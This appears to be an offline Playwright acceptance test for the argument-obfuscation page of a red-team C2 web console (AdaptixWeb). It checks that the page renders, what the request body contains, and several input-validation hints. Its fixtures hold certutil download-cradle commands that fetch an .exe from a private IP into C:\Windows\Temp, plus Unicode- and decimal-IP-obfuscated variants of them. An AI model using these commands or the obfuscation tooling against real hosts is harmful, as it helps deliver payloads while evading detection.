#!/usr/bin/env node
/* 参数混淆页面的**渲染与接线**验收（离线）。
 *
 * ★ 安全：本脚本**只做导航、输入与 DOM 量测**，不登录任何真实控制台、
 *   不带任何凭据、不向任何主机下发任何东西。它起一个本地静态服务器供 dist/，
 *   把控制台会打的每个接口都拦成假数据。
 *
 * 为什么 build 绿了还不够：vite 只证明能编译。它不证明这个页面**挂载得起来**
 *   （JSX 里少个可选链就是白屏），也不证明状态真的接上了线 ——
 *   比如 n 是否按服务端 max_variants 钳制、请求体里是否混进了 profile。
 *
 * 判据：
 *   X1  左栏有「参数混淆」，能进入，页面不白屏
 *   X2  服务端 /status 的值真的渲染出来（pwsh 版本 / 模型数 / 超时）
 *   X3  ★生成请求体恰为 {command, platform, n}，**不含 profile**
 *   X4  变体按服务端返回的条数与内容渲染，且是多行安全（pre-wrap）
 *   X5  插件缺失（路由非 JSON）⇒ 显示未加载横幅，且**不**误报成一般错误
 *   X6  裸命令 ⇒ 「至少要有一个参数」提示；完整路径 ⇒ 「只认裸命令名」提示
 *   X7  ★不在模型表里的命令 ⇒ 提前提示（点按钮之前），且不阻断输入
 *   X8  ★盘符后多一个空格（`C: \…`）⇒ 提示它单独成了一个参数。模块会把这个空格
 *        一起混淆下去（实测输出 7 个 token 而非 6 个），而变体是乱码，看不出来；
 *        X8c 反向确认去掉空格后**不再**提示
 *
 * 用法（在 AdaptixWeb/ 下，先 npm run build）: node scripts/verify_argfuscator_ui.mjs
 */
import path from 'node:path'
import url from 'node:url'
import { launchConsole } from './_harness.mjs'

const __dirname = path.dirname(url.fileURLToPath(import.meta.url))
const WEB = path.join(__dirname, '..')

let checks = 0
let fails = 0
function check(id, desc, pass, detail = '') {
  checks++
  console.log(`  ${pass ? '✓' : '✗'} ${id} ${desc}${detail ? ` | ${detail}` : ''}`)
  if (!pass) fails++
}

const STATUS = {
  ok: true,
  available: true,
  pwsh: '/usr/bin/pwsh',
  pwsh_version: '7.4.20',
  module_dir: '/root/cc/run/extenders/argfuscator',
  models: 156,
  commands: ['certutil', 'ipconfig', 'netstat', 'whoami', 'arp'],
  platforms: ['windows', 'linux', 'mac'],
  max_variants: 5,
  timeout_sec: 60,
}

// 第一个变体刻意做成**多行**：这正是分隔符存在的理由，也顺带验证渲染不折叠换行。
const V_MULTI = 'certutil -urlcache -split -f http://10.0.0.1/a.exe\nwhoami /all'
const V_TWO = 'ᶜᵉʳᵗᵘᵗⁱˡ -urlcache –split -f http://167772161/a.exe'

function mkRoutes(genBodies, statusRoute) {
  return {
    '/api/argfuscator/status': statusRoute,
    '/api/argfuscator/generate': (route, body, json) => {
      genBodies.push(body)
      return json({ ok: true, count: 2, variants: [V_MULTI, V_TWO], ms: 1420 })
    },
  }
}

const bodyText = (page) => page.$eval('.gen-main .card-bd', (e) => e.textContent.replace(/\s+/g, ' ')).catch(() => '')

async function main() {
  console.log('\n参数混淆页 渲染/接线 验收\n')

  // ── X1/X2/X3/X4/X6/X7：正常路径 ──
  {
    const genBodies = []
    const h = await launchConsole({
      routes: mkRoutes(genBodies, (route, body, json) => json(STATUS)),
    })
    try {
      const page = h.page

      await h.gotoView('参数混淆')
      const title = await page.$eval('.gen-main .card-hd h3', (e) => e.textContent.trim()).catch(() => '')
      check('X1', '左栏可进入「参数混淆」且页面渲染出标题',
        title.includes('参数混淆'), `标题="${title}"`)

      const side = await page.$eval('.gen-side .card-bd', (e) => e.textContent.replace(/\s+/g, ' ')).catch(() => '')
      check('X2', '/status 的值真的渲染出来（pwsh 版本 / 模型数 / 超时）',
        side.includes('7.4.20') && side.includes('156') && side.includes('60'),
        `右栏="${side.slice(0, 120)}"`)

      // X6：裸命令
      await page.fill('.axf-input', 'ipconfig')
      await page.waitForTimeout(250)
      let t = await bodyText(page)
      check('X6a', '裸命令 ⇒ 提示「至少要有一个参数」', t.includes('至少一个参数'),
        t.includes('至少一个参数') ? '' : `未出现提示；正文="${t.slice(0, 160)}"`)

      // X6：完整路径
      await page.fill('.axf-input', 'C:\\Windows\\System32\\certutil.exe -urlcache -f http://1.2.3.4/a')
      await page.waitForTimeout(250)
      t = await bodyText(page)
      check('X6b', '完整路径 ⇒ 提示「只认裸命令名」', t.includes('裸命令名'),
        t.includes('裸命令名') ? '' : `未出现提示；正文="${t.slice(0, 160)}"`)

      // X7：不在模型表里的命令
      await page.fill('.axf-input', 'zz_not_in_models -x')
      await page.waitForTimeout(250)
      t = await bodyText(page)
      check('X7', '★不在模型表里的命令 ⇒ 生成前就提示',
        t.includes('不在服务端') && t.includes('zz_not_in_models'),
        t.includes('不在服务端') ? '' : `未出现提示；正文="${t.slice(0, 160)}"`)

      // X8：盘符后多一个空格。实测输入 `… C: \Windows\Temp\A.exe` 产出的每个变体
      // 都是 7 个 token（正常是 6 个）—— 模块把空格一起混淆下去了，而变体是乱码，
      // 操作员没有任何办法看出来。所以必须在输入侧拦。
      // 输入与服务端那次实验**逐字相同**，好让 7-vs-6 这个对照真的对上：
      //   certutil -urlcache -split -f <url> C: \Windows\Temp\A.exe  → 7 个 token
      //   certutil -urlcache -split -f <url> C:\Windows\Temp\A.exe   → 6 个 token
      // （第一次写成不带 -split 的，页面显示「6 个参数」，是断言算错了不是页面错了）
      await page.fill('.axf-input', 'certutil -urlcache -split -f http://10.0.0.1/a.exe C: \\Windows\\Temp\\A.exe')
      await page.waitForTimeout(250)
      t = await bodyText(page)
      check('X8', '★盘符后多空格 ⇒ 提示「单独成了一个参数」',
        t.includes('单独成了一个参数'),
        t.includes('单独成了一个参数') ? '' : `未出现提示；正文="${t.slice(0, 160)}"`)
      check('X8b', '参数个数按实际分词显示（此处 7，与服务端实测一致）', t.includes('7 个参数'),
        t.includes('7 个参数') ? '' : `未显示 7 个参数；正文="${t.slice(0, 160)}"`)

      // X8c 反向：去掉那个空格必须**不再**提示、且个数回到 6 ——
      // 否则这条警告会变成没人看的常驻噪音。
      await page.fill('.axf-input', 'certutil -urlcache -split -f http://10.0.0.1/a.exe C:\\Windows\\Temp\\A.exe')
      await page.waitForTimeout(250)
      t = await bodyText(page)
      check('X8c', '盘符后无空格 ⇒ 不误报，且参数个数回到 6',
        !t.includes('单独成了一个参数') && t.includes('6 个参数'),
        `提示=${t.includes('单独成了一个参数')} 6个参数=${t.includes('6 个参数')}`)

      // ── X3/X4：真跑一次生成 ──
      await page.fill('.axf-input', 'certutil -urlcache -split -f http://10.0.0.1/a.exe whoami')
      await page.selectOption('.gen-main select', 'linux')
      await page.fill('.gen-main input[type="number"]', '2')
      await page.click('.axf-run button')
      await page.waitForSelector('.axf-item', { timeout: 8000 })

      check('X3', '★生成请求体恰为 {command, platform, n}，不含 profile',
        genBodies.length === 1 &&
        Object.keys(genBodies[0]).sort().join(',') === 'command,n,platform' &&
        genBodies[0].platform === 'linux' && genBodies[0].n === 2,
        `body=${JSON.stringify(genBodies[0])}`)

      const items = await page.$$eval('.axf-item', (els) => els.map((e) => ({
        n: e.querySelector('.axf-n')?.textContent.trim(),
        cmd: e.querySelector('.axf-cmd')?.textContent,
        ws: getComputedStyle(e.querySelector('.axf-cmd')).whiteSpace,
      })))
      check('X4', '变体按服务端返回渲染（2 条）+ 多行不折叠',
        items.length === 2 &&
        items[0].cmd === V_MULTI && items[1].cmd === V_TWO &&
        items[0].ws === 'pre-wrap' && items[0].cmd.includes('\n'),
        `条数=${items.length} 首条ws=${items[0]?.ws} 首条含换行=${items[0]?.cmd?.includes('\n')}`)

      check('X4b', '变体序号与「复制全部」在位',
        items[0]?.n === '#1' && items[1]?.n === '#2' && (await bodyText(page)).includes('复制全部'),
        `序号=[${items.map((i) => i.n).join(',')}]`)
    } finally {
      await h.close()
    }
  }

  // ── X5：插件缺失 ──
  {
    const genBodies = []
    const h = await launchConsole({
      routes: mkRoutes(genBodies, (route) =>
        // 真实部署里未注册的路由会落到静态兜底：非 JSON 的 HTML。
        route.fulfill({ status: 404, contentType: 'text/html', body: '<!doctype html><title>404</title>' })),
    })
    try {
      const page = h.page
      await h.gotoView('参数混淆')
      await page.waitForTimeout(600)
      const t = await bodyText(page)
      check('X5', '插件缺失 ⇒ 显示「未加载 argfuscator 插件」横幅',
        t.includes('未加载') && t.includes('argfuscator'),
        t.includes('未加载') ? '' : `正文="${t.slice(0, 200)}"`)

      const disabled = await page.$eval('.axf-run button', (b) => b.disabled).catch(() => null)
      check('X5b', '插件缺失时生成按钮禁用（不给必然失败的点击）', disabled === true,
        `disabled=${disabled}`)
    } finally {
      await h.close()
    }
  }

  console.log(`\n${fails === 0 ? '✅' : '❌'} ${checks - fails}/${checks} 通过\n`)
  process.exit(fails === 0 ? 0 : 1)
}

main().catch((e) => { console.error(e); process.exit(1) })
